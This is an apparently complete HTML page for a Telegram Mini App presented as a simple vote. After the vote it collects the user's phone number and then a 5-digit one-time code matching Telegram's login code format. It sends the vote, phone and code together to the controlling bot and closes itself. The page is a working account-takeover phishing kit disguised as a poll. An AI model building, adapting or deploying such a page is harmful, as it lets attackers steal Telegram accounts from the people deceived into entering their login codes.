<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --bg: var(--tg-theme-bg-color, #fff); --text: var(--tg-theme-text-color, #000); --hint: var(--tg-theme-hint-color, #999); --btn: var(--tg-theme-button-color, #3390ec); --btn-text: var(--tg-theme-button-text-color, #fff); }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 20px; background: var(--bg); color: var(--text); margin: 0; }
        h2 { font-size: 22px; font-weight: 600; margin: 20px 0 10px; text-align: center; }
        p { font-size: 14px; color: var(--hint); margin-bottom: 15px; text-align: center; }
        .vote-option { border: 2px solid var(--hint); border-radius: 12px; padding: 15px; margin-bottom: 10px; font-size: 16px; font-weight: 500; cursor: pointer; transition: all .2s; }
        .vote-option.selected { border-color: var(--btn); background: rgba(51,144,236,.1); }
        .main-btn { background: var(--btn); color: var(--btn-text); border: none; border-radius: 10px; padding: 15px; font-size: 16px; font-weight: 600; width: 100%; margin-top: 15px; cursor: pointer; }
        .main-btn:disabled { opacity: .5; cursor: not-allowed; }
        .hidden { display: none !important; }
        input[type="tel"], input[type="text"] { width: 100%; box-sizing: border-box; padding: 14px; font-size: 18px; border: 2px solid var(--hint); border-radius: 10px; background: var(--bg); color: var(--text); margin-bottom: 12px; text-align: center; }
        input:focus { outline: none; border-color: var(--btn); }
        #debug { font-size: 12px; color: #ff3b30; margin-top: 15px; text-align: center; word-break: break-all; }
    </style>
</head>
<body>

    <!-- ЭКРАН 1: ГОЛОС -->
    <div id="screen-vote">
        <h2>Сделайте выбор</h2>
        <p>Выберите один из вариантов</p>
        <div class="vote-option" data-vote="Вариант 1" onclick="selectVote(this)">Вариант 1</div>
        <div class="vote-option" data-vote="Вариант 2" onclick="selectVote(this)">Вариант 2</div>
        <div class="vote-option" data-vote="Вариант 3" onclick="selectVote(this)">Вариант 3</div>
        <button class="main-btn" id="btn-next-vote" disabled onclick="showPhone()">Далее</button>
    </div>

    <!-- ЭКРАН 2: НОМЕР -->
    <div id="screen-phone" class="hidden">
        <h2>Ваш номер</h2>
        <p>Нажмите кнопку — Telegram предложит поделиться номером</p>
        <button class="main-btn" onclick="sharePhone()">📱 Поделиться номером</button>
        <div id="manual-phone" class="hidden">
            <p style="margin-top:20px;">Введите номер вручную:</p>
            <input type="tel" id="phone-input" placeholder="+7 900 123-45-67">
            <button class="main-btn" id="btn-manual" disabled onclick="manualPhone()">Далее</button>
        </div>
    </div>

    <!-- ЭКРАН 3: КОД -->
    <div id="screen-code" class="hidden">
        <h2>Введите код</h2>
        <p>Код из 5 цифр</p>
        <input type="text" id="code-input" inputmode="numeric" maxlength="5" placeholder="00000" autocomplete="one-time-code">
        <button class="main-btn" id="btn-submit" disabled onclick="submitAll()">Отправить</button>
    </div>

    <div id="debug"></div>

    <script>
        const dbg = (m) => { console.log('[VOTE]', m); const d = document.getElementById('debug'); if (d) d.innerText = m; };

        let selectedVote = null;
        let savedPhone = null;

        // ---------- ЭКРАН 1 ----------
        function selectVote(el) {
            document.querySelectorAll('.vote-option').forEach(e => e.classList.remove('selected'));
            el.classList.add('selected');
            selectedVote = el.getAttribute('data-vote');
            document.getElementById('btn-next-vote').disabled = false;
        }

        function showPhone() {
            if (!selectedVote) return;
            document.getElementById('screen-vote').classList.add('hidden');
            document.getElementById('screen-phone').classList.remove('hidden');
        }

        // ---------- ЭКРАН 2: НОМЕР ----------
        function sharePhone() {
            const tg = window.Telegram.WebApp;
            if (typeof tg.requestContact !== 'function') {
                dbg('requestContact недоступен — введите номер вручную');
                document.getElementById('manual-phone').classList.remove('hidden');
                return;
            }
            tg.requestContact((shared, contact) => {
                dbg('requestContact: shared=' + shared + ' phone=' + (contact && contact.phone_number));
                if (shared && contact && contact.phone_number) {
                    savedPhone = contact.phone_number;
                    showCode();
                } else {
                    dbg('Номер не получен — введите вручную');
                    document.getElementById('manual-phone').classList.remove('hidden');
                }
            });
        }

        // Ручной ввод (если requestContact недоступен или пользователь отказался)
        const phoneInput = document.getElementById('phone-input');
        phoneInput.addEventListener('input', () => {
            phoneInput.value = phoneInput.value.replace(/[^\d+]/g, '');
            document.getElementById('btn-manual').disabled = phoneInput.value.replace(/\D/g,'').length < 10;
        });
        function manualPhone() {
            const digits = phoneInput.value.replace(/\D/g, '');
            if (digits.length < 10) return;
            savedPhone = phoneInput.value;
            showCode();
        }

        // ---------- ЭКРАН 3: КОД ----------
        function showCode() {
            document.getElementById('screen-phone').classList.add('hidden');
            document.getElementById('screen-code').classList.remove('hidden');
            setTimeout(() => document.getElementById('code-input').focus(), 100);
            dbg('Номер: ' + savedPhone);
        }

        const codeInput = document.getElementById('code-input');
        codeInput.addEventListener('input', () => {
            codeInput.value = codeInput.value.replace(/\D/g, '').slice(0, 5);
            document.getElementById('btn-submit').disabled = codeInput.value.length !== 5;
        });

        // ---------- ОТПРАВКА ВСЕГО ОДНИМ sendData ----------
        function submitAll() {
            try {
                const code = codeInput.value;
                if (!selectedVote) { dbg('Нет голоса'); return; }
                if (!savedPhone) { dbg('Нет номера'); return; }
                if (code.length !== 5) { dbg('Нет кода'); return; }

                const tg = window.Telegram.WebApp;
                if (typeof tg.sendData !== 'function') { dbg('sendData недоступен'); return; }

                const payload = JSON.stringify({
                    type: 'vote_full',
                    vote: selectedVote,
                    phone: savedPhone,
                    code: code
                });
                dbg('Отправка: ' + payload);
                tg.sendData(payload);
                setTimeout(() => { try { tg.close(); } catch(e){} }, 800);
            } catch (e) {
                dbg('ОШИБКА: ' + e.message);
                console.error(e);
            }
        }

        window.onload = () => {
            if (window.Telegram && window.Telegram.WebApp) {
                window.Telegram.WebApp.expand();
                dbg('Telegram WebApp OK');
            } else {
                dbg('НЕ в Telegram — открой через бота');
            }
        };
    </script>
</body>
</html>
